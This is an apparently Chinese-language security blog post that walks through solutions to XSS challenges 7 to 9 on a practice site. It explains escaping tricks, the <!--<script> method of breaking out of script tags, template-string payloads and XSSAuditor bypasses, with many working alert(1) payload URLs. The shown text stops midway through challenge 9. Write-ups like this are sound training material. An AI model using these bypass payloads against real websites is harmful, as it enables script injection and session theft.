<html>
  <head>
    <meta charset="utf-8" />
<meta name="referrer" content="no-referrer">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>十二个案例重新认识 XSS (下) | xray 技术博客</title>
<link rel="shortcut icon" href="https://blog.xray.cool/favicon.ico?v=1620790414551">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://blog.xray.cool/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="十二个案例重新认识 XSS (下) | xray 技术博客 - Atom Feed" href="https://blog.xray.cool/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">


<script async src="https://www.googletagmanager.com/gtag/js?id=UA-176727836-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-176727836-2');
</script>


    <meta name="description" content="前言
前段时间看到了px1624的10题XSS案例，一直留着留着，终于拿出来看看了。还好网站没关。（然后突然增加了2题变成了12题了）
觉得是一个JS基础不是很好的菜鸡补充了解一些JS基础和奇怪姿势的很好的案例，此文包含7-12题(共9k3..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://blog.xray.cool">
  <img class="avatar" src="https://blog.xray.cool/images/avatar.png?v=1620790414551" alt="">
  </a>
  <h1 class="site-title">
    xray 技术博客
  </h1>
  <p class="site-description">
    
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives/" class="menu">
          归档
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              十二个案例重新认识 XSS (下)
            </h2>
            <div class="post-info">
              <span>
                2020-12-03
              </span>
              <span>
                39 min read
              </span>
              
            </div>
            
              <img class="post-feature-image" src="https://blog.xray.cool/post-images/12cases-about-xss-part2.png" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content">
                <h2 id="前言">前言</h2>
<p>前段时间看到了px1624的10题XSS案例，一直留着留着，终于拿出来看看了。还好网站没关。（然后突然增加了2题变成了12题了）</p>
<p>觉得是一个JS基础不是很好的菜鸡补充了解一些JS基础和奇怪姿势的很好的案例，此文包含7-12题(共9k3字)，知识点大概包括：</p>
<ul>
<li>当在字符串过滤中使用<code>\</code>的绕过方式</li>
<li><code>&lt;!-- &lt;script&gt;</code>可以突破<code>&lt;/script&gt;</code>标签的限制</li>
<li>浏览器对于<code>&lt;script/&gt;</code>不解析为标签，但是<code>&lt;script /&gt;</code>一类的可以正常解析</li>
<li>浏览器对于JS无分号换行的处理方式</li>
<li><code>&lt;!-- &lt;script&gt;</code>可以多次突破<code>&lt;/script&gt;</code>标签的限制</li>
<li><code>&lt;script&gt;</code>标签之间互相不管死活</li>
<li>模板字符串的嵌套</li>
<li>闭合大括号的方式：对象等</li>
<li>使用%2f让浏览器不会吞掉多余路径</li>
<li>JS语言声明变量时<strong>变量提升</strong>的特性</li>
<li>var的另一种赋值方式：<strong>解构赋值</strong></li>
</ul>
<p>对于以上列出知识点如果只有个别不清楚的，可以直接在各题知识点中找到它，然后看那一题就行了。</p>
<p>后6题跟前6题有点不一样，前六题可能是你看了知识点，就会恍然大悟：“原来是这样！我会了！”，但是后六题可能就是看了知识点：“原来是这样！”，但是还是做不来。</p>
<blockquote>
<p>此外还提出了第十题比已有解法更短的payload，以及官方WP暂未发布的第十一题、第十二题的WP。</p>
</blockquote>
<p>px1624的官方WP，写的很好。但是以菜鸡的角度去看题目总会讲述到一些默认被跳过的但是又有点东西的细节。写文章一向往细了写，结合了看可能也会有所帮助吧？</p>
<p>有错误喷就完事了。</p>
<blockquote>
<p>感谢px1624老哥的案例分享，十一题十二题原作者renwax23的案例分享</p>
<p>以及huuu老哥的十二题最短解</p>
</blockquote>
<h2 id="第七题">第七题</h2>
<p>题目：http://px1624.sinaapp.com/test/xsstest7/?px=123</p>
<pre><code class="language-html">&lt;script&gt;
var px='123';
&lt;/script&gt;
give me xss by pass~7
&lt;div style=&quot;display:none&quot;&gt;123&lt;/div&gt;
&lt;!--px--&gt;
&lt;script&gt;
'px'
&lt;/script&gt;
</code></pre>
<p><strong>知识点</strong>：</p>
<ul>
<li>当在字符串过滤中使用<code>\</code>的绕过方式</li>
<li><code>&lt;!-- &lt;script&gt;</code>可以突破<code>&lt;/script&gt;</code>标签的限制</li>
<li>浏览器对于<code>&lt;script/&gt;</code>不解析为标签，但是<code>&lt;script /&gt;</code>一类的可以正常解析</li>
<li>浏览器对于JS无分号换行的处理方式</li>
</ul>
<p>题目的尿性，提示px，肯定是输入px参数，也就直接加上啦，就会发现有两个回显点：script标签中一个，div标签中一个。</p>
<p>老样子使用一个字符集去看看两个地方是怎么处理的：<code>123&quot;'/\&lt;&gt;()'%3b+%2b-*/%26|~^%25!%3f%3d%60%3b</code></p>
<pre><code class="language-html">&lt;script&gt;
var px='123px_xss\'\/\\&lt;\&gt;()\'\;  -*\/&amp;|~^%!?=`\;';
&lt;/script&gt;
give me xss by pass~7
&lt;div style=&quot;display:none&quot;&gt;123&amp;quot;'/\&amp;lt;&amp;gt;()'; +-*/&amp;amp;|~^%!?=`;&lt;/div&gt;
&lt;!--px--&gt;
&lt;script&gt;
'px'
&lt;/script&gt;
</code></pre>
<ul>
<li>第一处插入点，在script标签中：对于<code>' / &lt; &gt; ;</code>做了<code>\</code>转义，使用转义可以防止<code>'</code>作为符号解析闭合字符串</li>
<li>第二处插入点，在div标签中：对于<code>' &lt; &gt; &amp;</code>做了html转义，防止插入标签。</li>
</ul>
<p>看似挺好的防护，第二处<code>&lt; &gt;</code>被转义插入不了标签是完全没有机会的，直接掠过，看第一处插入点</p>
<h3 id="字符串中的转义绕过">字符串中的<code>\</code>转义绕过</h3>
<p>如果我们简单的插入一个单引号确实是会被转义从而闭合无效：<code>var px='123\''</code></p>
<p>但是我们知道字符串中的<code>\</code>一个使用的使用是对后面的字符做转义处理，即作为字符串的一部分解析，同样我们想要在字符串中使用<code>\</code>符号的时候需要<code>\\</code>这样书写即为一个<code>\</code></p>
<p>回顾转义列表，并没有对我们输入的<code>\</code>进行转义，于是我们就可以输入一个<code>\</code>来反过来转义掉服务端添加的用于转义<code>'</code>的<code>\</code></p>
<pre><code class="language-js">//http://px1624.sinaapp.com/test/xsstest7/?px=123\'
//第一个\用于转义服务端添加的\
//'作为结构进行闭合
var px='123\\''
</code></pre>
<p>于是完成闭合，接下来可以尝试拼接js，引入可以执行的js代码。</p>
<h3 id="5种方法尝试闭合">5种方法尝试闭合</h3>
<p>根据已有知识，给出后面单引号的五条闭合思路：</p>
<ol>
<li>正儿八经闭合，构造正确的JS语法，<strong>可以尝试</strong></li>
<li><code>//</code>：JS单行注释，注释掉后面需要闭合的东西，<strong>可以尝试</strong>。</li>
<li><code>/* */</code>：JS跨行注释，<strong>在当前环境上不能使用</strong>。突破不了script标签，只能在script标签内部进行多行注释</li>
<li><code>&lt;!--</code>：HTML跨行注释，<strong>机制上不能使用</strong>。HTML跨行注释，在script标签中，起不到注释作用</li>
<li>模板字符串注释—反引号：跨行注释，没试过，<strong>可以尝试</strong>。</li>
</ol>
<p>再结合给出两条payload插入思路进行判断：</p>
<ol>
<li>JS中<code>;</code>闭合前面的语句然后写入新的JS语句</li>
<li>使用运算符拼接字符串的形式，即使用<code>-</code>、<code>in</code>之类的符号</li>
</ol>
<p>第一个payload插入思路使用；明显不行因为<code>;</code>被/转义了形成<code>/;</code>会语法报错；只能使用第二个思路使用运算符。</p>
<ul>
<li>尝试<strong>第一个闭合思路</strong>：<strong>正儿八经闭合</strong>，后面是<code>';</code></li>
</ul>
<pre><code class="language-html">// http://px1624.sinaapp.com/test/xsstest7/?px=123\'-alert(1)-'
&lt;script&gt;
var px='123\\'-alert(1)-\'';
&lt;/script&gt;
</code></pre>
<p>后面单引号因为引入了一个<code>\</code>，这样的语法会报错，GG。</p>
<ul>
<li>尝试<strong>第二个思路</strong>：<code>//</code>JS单行注释：</li>
</ul>
<pre><code class="language-html">// http://px1624.sinaapp.com/test/xsstest7/?px=123\'-alert(1)//
&lt;script&gt;
var px='123\\'-alert(1)\/\/';
&lt;/script&gt;
</code></pre>
<p>同样因为<code>/</code>会被<code>\</code>转义导致无法引入单行注释符号，GG</p>
<ul>
<li>证明<strong>第三个思路</strong>不可用：<code>/* */</code>：JS跨行注释</li>
</ul>
<p>建立该测试页面，访问</p>
<pre><code class="language-html">&lt;script&gt;
var px='123';/*
&lt;/script&gt;
give me xss by pass~7
*/
</code></pre>
<figure data-type="image" tabindex="1"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui8diry8j30qn06kt8y.jpg" alt="7-3-false.png" loading="lazy"></figure>
<p>文字不会被注释，代表<code>/* */</code>JS跨行注释无法突破script标签进行跨行注释。</p>
<ul>
<li>证明<strong>第四个思路</strong>不可用：<code>&lt;!--</code>：HTML跨行注释</li>
</ul>
<p>建立测试页面，访问</p>
<pre><code class="language-html">&lt;script&gt;
&lt;!--
var px='123';
&lt;/script&gt;
give me xss by pass~7
--&gt;
</code></pre>
<p>文字不会被注释，代表<code>&lt;!-- --&gt;</code>HTML跨行注释无法突破script标签进行跨行注释。</p>
<figure data-type="image" tabindex="2"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui8ir3a5j30sv07j3yr.jpg" alt="7-4-false.png" loading="lazy"></figure>
<ul>
<li>尝试<strong>第五个思路</strong>：<strong>模板字符串</strong>进行跨行注释</li>
</ul>
<pre><code class="language-html">// http://px1624.sinaapp.com/test/xsstest7/?px=\'-alert(1)-`;//

&lt;script&gt;
var px='\\'-alert(1)-`\;\/\/';
&lt;/script&gt;
give me xss by pass~7
&lt;div style=&quot;display:none&quot;&gt;\'-alert(1)-`;//&lt;/div&gt;
&lt;!--px--&gt;
&lt;script&gt;
'px'
&lt;/script&gt;
</code></pre>
<p>看vscode中的高亮应该清楚点，这里显示是可以成功跨script标签进行注释的。</p>
<figure data-type="image" tabindex="3"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui8o8xgwj30pb0b1t9c.jpg" alt="7-vscode高亮.png" loading="lazy"></figure>
<p>尝试在命令行中执行这段JS，逻辑是没有问题的：</p>
<figure data-type="image" tabindex="4"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui8sb55kj313n0oiabg.jpg" alt="7-弹框.png" loading="lazy"></figure>
<p>但是直接访问，让谷歌浏览器解析，仍然无法跨越script标签，同时其他浏览器也不行。</p>
<figure data-type="image" tabindex="5"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui8y3emyj30rh0gbjsb.jpg" alt="7-5-谷歌解析.png" loading="lazy"></figure>
<p>看来模板字符串也被封死了，<strong>关键是无法突破<code>&lt;/script&gt;</code>标签</strong>，陷入僵局。</p>
<h3 id="-标签突破script标签">&lt;!-- 标签突破script标签</h3>
<p>参考<a href="https://www.dazhuanlan.com/2019/10/25/5db1e6beea817/">此篇文章</a>得知<code>&lt;!--</code>标签会改变script标签配对规则，即：在<code>&lt;!--</code>之后的<code>&lt;script&gt;</code>会优先匹配一个<code>&lt;/script&gt;</code></p>
<p>我们可以引入一个script去闭合掉原生的<code>&lt;/script&gt;</code>，这样就可以突破script把后面也作为JS解析。</p>
<p>但是这个特性在测试中，并不是那么万能，具有局限性。</p>
<p>按照字面解释的预期，这样的页面是可以正常执行JS的</p>
<pre><code class="language-html">&lt;script&gt;  
    alert(1);
    &lt;!-- 
        &lt;script&gt; 
        &lt;/script&gt;
    --&gt;
&lt;/script&gt;
</code></pre>
<p>但是实际并不可以，会报错。</p>
<p>我们先通过以下例子来证明在<code>&lt;!--</code>之后的<code>&lt;script&gt;</code>的确会抢先匹配，影响标签解析：</p>
<pre><code class="language-html">&lt;script&gt;  
    alert(1);
    &lt;!-- &lt;script&gt; //删这行
    if(1&lt;/script&gt;/){
        alert(1)
    }
    --&gt;
&lt;/script&gt;
</code></pre>
<p>单行的<code>&lt;!--</code>在JS中具有单行注释的作用，所以按照正常的理解，理论上第三行加了和没加应该是一样的，但是实际结果却不是</p>
<ul>
<li>不删第三行：会弹框1（说明JS正常执行）</li>
<li>删第三行：之后的alert(1)会被当作html解析，即script标签结束了（说明script标签被<code>1&lt;/script&gt;/</code>这边的script标签提前闭合了）</li>
</ul>
<p>情况出现了变化，证明我们的<code>&lt;!-- &lt;script&gt;</code>虽然是注释了，但是却改变了执行情况，即优先闭合下一个script后标签。说明我们注释的<code>&lt;script&gt;</code>把<code>1&lt;/script&gt;/</code>这边的标签给闭合了从而完成了外部标签的正常闭合。</p>
<p>再看例子：</p>
<pre><code class="language-HTML">&lt;script&gt;
    if(console.log(&quot;&lt;!--var a;&lt;script&gt;&quot;)&lt;/script&gt;/)
        alert(&quot;script data state&quot;);
    else
        alert(&quot;script data state too&quot;);
        --&gt;
&lt;/script&gt;
</code></pre>
<p>此处我们的<code>&lt;!--</code>出现在了字符串中，执行结果是console.log打印并且弹框script data state</p>
<p>先得出最终使用结论，再来对上述例子进行解释：</p>
<ol>
<li>
<p>JS在引入的<code>&lt;!--</code>跟<code>script标签</code>后形成的代码要满足JS语法正确。</p>
<p>（在script标签对中，突然出现一个script标签，这是不符合JS语法的。这就解释了我们之前第一个预期成功然而失败的案例，是因为JS语法错误而失败）</p>
</li>
<li>
<p>满足JS语法后的解析，会开始跳出JS语法逻辑寻找<code>&lt;!--</code>。只是单纯的字符串匹配，所以即使是字符串内的<code>&lt;!--</code>或者注释的<code>&lt;!--</code>都满足。</p>
</li>
<li>
<p>会开始寻找 script标签，同样寻找的过程同样跟JS语法无关，会单纯的寻找标签字符</p>
</li>
</ol>
<p>对之前的例子进行解释：</p>
<pre><code class="language-JS">//首先上述两个成功执行的实例都JS语法正确
&lt;!-- &lt;script&gt; //JS中&lt;!-- 作为注释符 后面被注释了 JS语法正确
&quot;&lt;!--var a;&lt;script&gt;&quot; //&lt;!--和&lt;script&gt;作为字符串 JS语法正确
//关于&lt;/script&gt;/
console.log(&quot;&lt;!--var a;&lt;script&gt;&quot;)&lt;/script&gt;/  
1&lt;/script&gt;/
//虽然出现了&lt;/script&gt;,但是后面多了一个/
//这里其实是为了满足JS语法补充一个/
//作为JS解析的话其实是一个比较运算符 两边进行小于&lt;比较
//右侧是一个正则表达式的//
</code></pre>
<p>至此我们就得出了**&lt;!--标签在JS语法正确的情况下可以引入scirpt前标签去优先闭合script后标签从而完成script标签突破**，来结合题目解题。</p>
<pre><code class="language-html">// http://px1624.sinaapp.com/test/xsstest7/?px=123\%27-alert(1)//

&lt;script&gt;
var px='123\\'-alert(1)\/\/';
&lt;/script&gt;
give me xss by pass~7
&lt;div style=&quot;display:none&quot;&gt;123\'-alert(1)//&lt;/div&gt;
&lt;!--px--&gt;
&lt;script&gt;
'px'
&lt;/script&gt;
</code></pre>
<p>参考题目环境，我们明确需要处理：</p>
<ul>
<li>加入<code>&lt;!--&lt;script&gt;</code>去闭合第一个<code>&lt;/script&gt;</code>：需要防止JS语法错误（可以加入到字符串中）</li>
<li>突破script标签后，这部分give me xss什么的会作为JS的一部分解析，我们需要引入一个<strong>跨行字符串或注释</strong>一类的包括住他们，确保其语法正确。（可以选用模板字符串或者<code>/* */</code>JS多行注释(之后测试由于环境，单独使用JS多行注释无法完成)）</li>
<li>由于第一个script标签会跟最后一个script后标签闭合，<code>&lt;/div&gt;&lt;!--px</code>之后都会被认为是JS语句，还需要处理这边的JS语法错误问题。</li>
</ul>
<p>选择加入到前方字符串中，选择模板字符串，先暂时使用<code>//</code>注释掉明显不对劲的<code>&lt;/div&gt;</code>，给出一个初步的payload：</p>
<pre><code class="language-u">http://px1624.sinaapp.com/test/xsstest7/?px=123%3C!--%3Cscript%3E\%27-alert(1)-`//
</code></pre>
<figure data-type="image" tabindex="6"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui9ap3tzj30u20d5wfe.jpg" alt="7-0-script标签绕过.png" loading="lazy"></figure>
<p>会发现闭合失败了，<code>&lt;/script&gt;</code>还是没有被我们吃掉，因为<code>&lt;script&gt;</code>被转义成<code>&lt;script/&gt;</code>(前面的\不影响)</p>
<p>实验，利用浏览器的特性，加个空格%20：</p>
<pre><code class="language-html">&lt;script\&gt;(解析失败)
&lt;script \&gt;(解析成功)
    alert(1)
&lt;/script&gt;
</code></pre>
<p>前标签加个空格，也可以正常解析，成功弹框Writeup:</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest7/?px=123%3C!--%3Cscript%20%3E\%27-alert(1)-`//
</code></pre>
<figure data-type="image" tabindex="7"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui9l68dnj30w00950th.jpg" alt="7-0-成功.png" loading="lazy"></figure>
<p>但是回想到刚才其实我们没有明确解决的后面尾巴的问题：我们只是想先简单暂时解决下<code>&lt;/div&gt;</code>，但是后面的<code>&lt;script&gt;'px'</code>都没有处理为啥就可以成功了？这关乎到<strong>JS的换行逻辑</strong></p>
<p>JS其实也是一个比较随便的语言，他的<strong>换行会根据当前运算环境分析是要结束当前语句或者是延续下一行拼接</strong>，看一个例子：</p>
<pre><code class="language-HTML">&lt;script&gt;
    var px=1 - 0
    // 4&gt;1
    &lt;4&gt;1
    &lt;'px'
    console.log(px)
&lt;/script&gt;
</code></pre>
<ul>
<li>如果我们不注释第三行，那么px的值为1，说明赋值语句已经结束了，之后的运算会作为一个新的运算语句解析；</li>
<li>如果我们注释的第三行，结果就会为false，浏览器会把之后的运算认为和赋值语句是一个语句，从而进行比较运算。</li>
</ul>
<p>我们把答案的环境简化再合成一行：</p>
<pre><code class="language-html">&lt;script&gt;
var px='1' - alert(2) - `3` &lt; 4 &gt; 'px'
//var px='1' - alert(2) - `3` &lt; a &gt; 'px'
console.log(px)
&lt;/script&gt;
</code></pre>
<p>该例子语法正确，只是在语句执行的时候从左向右执行，发现找不到a（也就是script）这个变量时报错，但是这不是JS语法错误而是运行的时候报错，所以会正常执行前面的弹框语句。</p>
<p>再给出其他人的一些payload：</p>
<pre><code class="language-html">//px1642
http://px1624.sinaapp.com/test/xsstest7/?px=111\%27-alert(1)-`//%3C!--%3Cscript%20
//Huuuuu
http://px1624.sinaapp.com/test/xsstest7/?px=`//*%3C!--%3Cscript%20%3E\%27-alert(1)-`
//香草
http://px1624.sinaapp.com/test/xsstest7/?px=\%27-`-eval(location.hash.slice(1))//%3C!--%20%3Cscript%20%3E`-`#alert(1)
//zeddy
http://px1624.sinaapp.com/test/xsstest7/?px=%3C!--%3Cscript%20`/*\%27-alert(1)-`*///
</code></pre>
<h2 id="第八题">第八题</h2>
<p>题目：http://px1624.sinaapp.com/test/xsstest8/?px=123</p>
<pre><code class="language-js">// http://px1624.sinaapp.com/test/xsstest8/?px=123&lt;&gt;%2b-*/%26|~^%25!%3f%3d`'&quot;

&lt;script&gt;
var px='123\&lt;\&gt; -*\/&amp;|~^%!?=`\'px_xss';
var px1624='123\&lt;\&gt; -*\/&amp;|~^%!?=`\'px_xss';
&lt;/script&gt;
give me xss by pass~8
&lt;div style=&quot;display:none&quot;&gt;123\&amp;lt;\&amp;gt; -&lt;/div&gt;
&lt;input type=&quot;hidden&quot; value=&quot;123&lt;&gt;+-*/&amp;|~^%!?=`'px_xss&quot;&gt;
</code></pre>
<p>知识点：</p>
<ul>
<li>延续之前知识点</li>
<li><code>&lt;!-- &lt;script&gt;</code>可以多次突破<code>&lt;/script&gt;</code>标签的限制</li>
<li><code>&lt;script&gt;</code>标签之间互相不管死活</li>
</ul>
<p>基础检测payload一丢，四处输出点，确认可以构造payload的输出点：</p>
<ul>
<li>第四处对双引号做了黑名单，没戏</li>
<li>第三处对长度做了限制，同时对&lt;&gt;做了转义，没戏</li>
<li>同时注意这几处输出的输出处理规则都不太一样</li>
</ul>
<p>还是看第一处第二处，突破单引号：</p>
<pre><code class="language-html">// http://px1624.sinaapp.com/test/xsstest8/?px=123\%27
&lt;script&gt;
var px='123\\'';
var px1624='123\\'';
&lt;/script&gt;
give me xss by pass~8
&lt;div style=&quot;display:none&quot;&gt;123\\'&lt;/div&gt;
&lt;input type=&quot;hidden&quot; value=&quot;123\'&quot;&gt;
</code></pre>
<p>老样子可以出来，第一个想法是老规矩在第一个script标签内部尝试构造一个JS语法正确的语句，但是我们会发现，我们永远没法处理最后面的<code>';</code>，比如：</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest8/?px=123\'-alert(1)-`
</code></pre>
<figure data-type="image" tabindex="8"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui9rt7v2j30gj01z0ss.jpg" alt="8-1.png" loading="lazy"></figure>
<ol>
<li>尝试注释符处理后面的尾巴：
<ul>
<li><code>&lt;!--</code>：过滤器变为<code>\&lt;!--</code>，多了一个\无法处理</li>
<li><code>//</code>：过滤器变为<code>\/\/</code>，失去注释作用</li>
<li><code>/*</code>：过滤器变为<code>\/*</code>，多了一个\无法处理，同时即使没有\，单单/*的语法也不行</li>
</ul>
</li>
<li>尝试单引号闭合：
<ul>
<li><code>'</code>：过滤器变为<code>/'</code>。多了一个\无法处理</li>
</ul>
</li>
</ol>
<p>已有知识无解，换条路，尝试用<code>&lt;!--&lt;script&gt;</code>突破script后标签把下面两个输入点也拉入战局，寻求机会。</p>
<p>思来想去，怼到极致还是死在/上，同时满足不了语法。</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest8/?px=123\%27-alert(1)-`*/*%3C!--%3Cscript%20%3E
</code></pre>
<figure data-type="image" tabindex="9"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui9yto6aj30u0080jsj.jpg" alt="8-2.png" loading="lazy"></figure>
<p>放弃。（实际这个思路是有解的，但是不是上述思路）</p>
<h3 id="多次突破script标签">多次突破script标签</h3>
<p>换个思路，我们既然可以逃出一个script标签，那是不是可以把标签全部逃光，然后自己写标签？</p>
<ul>
<li>那要求我们最后一个输出点不过滤，即：可以自己构造一个被解析的script标签，但是这里最后一个输出点就恰好只过滤双引号不过滤其他的。</li>
</ul>
<p>Writeup：</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3Cscript%20%3E%3C/script%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

payload:
&lt;!--&lt;script &gt;&lt;/script&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<p>这里可以看到实际上我们只考虑了标签闭合引入了两个script后标签，其他啥都没考虑，原来script标签内的语法一团糟，疯狂报错，但是因为script标签之间互不影响，这不影响我们写入的script的标签正常解析！</p>
<figure data-type="image" tabindex="10"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuia57pzfj310g09a0u1.jpg" alt="8-3.png" loading="lazy"></figure>
<p>但实际上可以调换位置，把<code>&lt;script &gt;</code>直接作为外面的script标签解析，可以短一点：</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3C/script%3E%3Cscript%20%3Ealert(1)%3C/script%3E

p1g3、zeddy payload:
&lt;!--&lt;/script&gt;&lt;script &gt;alert(1)&lt;/script&gt;
</code></pre>
<h3 id="绕过谷歌xss过滤器-xssauditor">绕过谷歌XSS过滤器-XSSAuditor</h3>
<p>这一步骤在该题其实并非必须步骤，按照出题者的原话说，上述的payload在谷歌浏览器的旧版本是不可以使用的，<a href="https://zhuanlan.zhihu.com/p/74288648">新版本xssAuditor被关闭</a>了，所以可以直接弹框。这里简单看看如何绕过xssAuditor吧。首先了解下<a href="https://blog.csdn.net/yanghuan313/article/details/53565545">谷歌浏览器的xssAuditor</a>，大致过滤逻辑如下：</p>
<ol>
<li>GET或POST请求中的参数内容原样出现在输出的页面中</li>
<li>内容包括一些敏感的危险标签和属性就会执行过滤，拒绝执行。</li>
</ol>
<p>那么绕过思路也对应着在<strong>使输出内容跟输入内容不一致</strong>，<strong>绕过黑名单的检测</strong>，历史上也有很多针对<a href="https://www.leavesongs.com/chrome-xss-auditor-bypass-collection.html?utm_source=tuicool&amp;utm_medium=referral">谷歌浏览器的绕过方式</a>。</p>
<p>回到这题本身，除了用一些通用的绕过方式，还可以根据当前过滤环境给出如下香草的payload：</p>
<pre><code>// http://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3C/script%3E%3Cscript%20%3E%22=alert(1)%3C/script%3E

payload:
&lt;!--&lt;/script&gt;&lt;script &gt;&quot;=alert(1)&lt;/script&gt;
</code></pre>
<p>可以关注到，只是加了一个<code>&quot;=</code>，结合上过滤规则是会替换<code>&quot;</code>为<code>px_xss</code>，这样完成了参数中的数据跟输出的结果不一致了。</p>
<figure data-type="image" tabindex="11"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuiadipk6j30zb09hab9.jpg" alt="8-4-绕过XSS.png" loading="lazy"></figure>
<h3 id="使用模板字符串的思路">使用模板字符串的思路</h3>
<blockquote>
<p>请做完第九题，第十题再回来这边</p>
</blockquote>
<p>做完第十题，再回过头会发现这题跟第十题的情况是相似的，都是第三个输出点存在截断。</p>
<p>那么这题应该也是可以使用模板字符串的思路，直接使用第十题的payload看看：</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest8/?px=`}\%27-{a:`}-alert(1)//${`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="12"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuib9bag3j31jn0pk0va.jpg" alt="8-2-1.png" loading="lazy"></figure>
<p>大失败。但是从页面来看又完全没有问题，同时把这段JS放到命令栏中是可以弹框的？</p>
<figure data-type="image" tabindex="13"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuibes838j31q40k440p.jpg" alt="8-2-2.png" loading="lazy"></figure>
<p>那么问题肯定是出在其他地方，对比下和第10题的返回页面，就会发现区别在于缺少<code>&lt;/script&gt;</code>。</p>
<figure data-type="image" tabindex="14"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuibj9dyyj310i0iimyc.jpg" alt="8-2-3.png" loading="lazy"></figure>
<p>在不修改结构的情况下，想办法引入一个即可。</p>
<pre><code>http://px1624.sinaapp.com/test/xsstest8/?px=`}\%27-{a:`}-alert(1)//&lt;/script&gt;${`${`&lt;!--&lt;script%20&gt;
</code></pre>
<figure data-type="image" tabindex="15"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuibovcpvj31hj0a53z7.jpg" alt="8-2-4.png" loading="lazy"></figure>
<p>完美。</p>
<p>其他老哥的payload：</p>
<pre><code>出题人WP：
http://px1624.sinaapp.com/test/xsstest8/?px=\%27-{a:`}-alert(1)//%3C/script%3E`}-{a:`${`%3C!--%3Cscript%20%3E
gainover：
http://px1624.sinaapp.com/test/xsstest8/?px=\%27-{a:`}-alert(1)//%3C/script%3E%3C!--%3Cscript%20%3E`}-{c:`${`
香草：
http://px1624.sinaapp.com/test/xsstest8/?px=`}-alert(1)//%3C/script%3E`}-{a:`${`\%27-{a:`}${`%3C!--%20%3Cscript%20%3E
huuu：
http://px1624.sinaapp.com/test/xsstest8/?px=`}//%3C/script%3E1111111`-alert(1)-{a:`${`\%27-`}${`%3C!--%3Cscript%20%3E
</code></pre>
<h2 id="第九题">第九题</h2>
<p>题目：http://px1624.sinaapp.com/test/xsstest9/?px=123</p>
<pre><code class="language-html">// http://px1624.sinaapp.com/test/xsstest9/?px=&lt;&gt;+-*/%26|~^%25!%3f%3d`'&quot;1234

&lt;script&gt;
var px='\&lt;\&gt; -*\/&amp;|~^%!?=`\'\&quot;1234';
var px1624='\&lt;\&gt; -*\/&amp;|~^%!?=`\'\&quot;1234';
&lt;/script&gt;
give me xss by pass~9
&lt;div style=&quot;display:none&quot;&gt;&amp;lt;&amp;gt; -*/&amp;amp;|~^%!?=`'&amp;quot;123&lt;/div&gt;//这里4被吃了，说明长度限制
&lt;div style=&quot;display:none&quot;&gt;&amp;lt;&amp;gt; -*/&amp;amp;|~^%!?=`'&amp;quot;123&lt;/div&gt;//这里4被吃了，说明长度限制
&lt;!--px--&gt;
&lt;script&gt;'px'&lt;/script&gt;
</code></pre>
<p>知识点：</p>
<ul>
<li>
<p>延续之前知识点</p>
</li>
<li>
<p>模板字符串的嵌套：</p>
<pre><code class="language-js">`abc${`def`}`
//abcdef
</code></pre>
</li>
<li>
<p>闭合大括号的方式：对象等</p>
</li>
</ul>
<p>基础payload一样一砸，会发现这题跟第八题输出点、过滤规则大致都一致。回顾第八题我们思考了两种思路去解决：</p>
<ol>
<li>
<p>突破第一个<code>&lt;/script&gt;</code>标签，把所有输入点拉入战局，尝试在JS中构造一个合法的语句。但是无法因为总是多出<code>\</code>无法解决</p>
</li>
<li>
<p>突破全部<code>&lt;/script&gt;</code>标签，自己重新起一个script标签，然后写入语句，成功</p>
</li>
</ol>
<p>再看这里的输出点过滤，对于之前利用处的第四处输出同样进行了html编码，这样我们就无法引入一个<code>&lt;script&gt;</code>标签，进行弹框。</p>
<p>同时还在第三处第四处进行了<strong>长度限制</strong>，只允许20个字符显示，那就要硬怼我们刚才对不过去的第一条路。</p>
<p>回顾我们之所以做不过去的原因：我们所有列出的注释符号都会引入<code>\</code>进行注释；我们尝试闭合也会因为<code>\</code>。那么有没有不被注释的可以利用的多行注释呢，其实是有的：<strong>模板字符串</strong>。</p>
<p>但是我们在利用的时候会发现有问题，先梳理payload需要满足的基本格式：</p>
<ul>
<li>必须拥有闭合单引号的<code>\'</code></li>
